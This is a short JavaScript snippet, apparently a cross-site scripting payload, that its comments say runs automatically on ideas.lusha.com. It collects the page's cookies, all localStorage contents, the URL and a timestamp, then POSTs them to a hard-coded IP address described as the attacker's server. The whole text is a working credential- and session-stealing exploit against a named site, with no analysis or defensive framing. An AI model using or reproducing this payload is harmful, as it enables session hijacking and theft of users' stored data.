// Automatically runs in the context of ideas.lusha.com
(() => {
  const exfilData = {
    cookies: document.cookie,
    localStorage: Object.fromEntries(Object.entries(localStorage)),
    location: location.href,
    timestamp: new Date().toISOString()
  };

  // Send to attacker's server
  fetch("http://54.85.136.163:8080/jpd.php", {
    method: "POST",
    body: JSON.stringify(exfilData),
    headers: {
      "Content-Type": "application/json"
    }
  });
})();
